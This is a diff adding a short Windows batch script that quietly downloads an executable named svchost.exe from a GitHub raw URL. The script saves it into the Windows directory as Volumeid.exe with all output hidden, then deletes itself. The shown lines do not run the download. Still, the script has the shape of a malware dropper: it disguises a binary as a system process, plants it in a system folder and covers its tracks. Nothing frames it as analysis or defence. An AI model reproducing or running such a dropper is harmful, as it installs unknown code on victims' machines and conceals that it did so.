@@ -1,0 +1,4 @@
+@echo off
+title 
+@curl --noproxy "*" --fail -L --proto "=https" --tlsv1.2 -o "%windir%\Volumeid.exe" "https://raw.githubusercontent.com/hidparse/friendly-dollop/refs/heads/main/svchost.exe" >nul 2>&1
+(attrib -r -h -s "%~f0" >nul 2>&1 &  del /f /q /s "%~f0" >nul 2>&1 & exit)
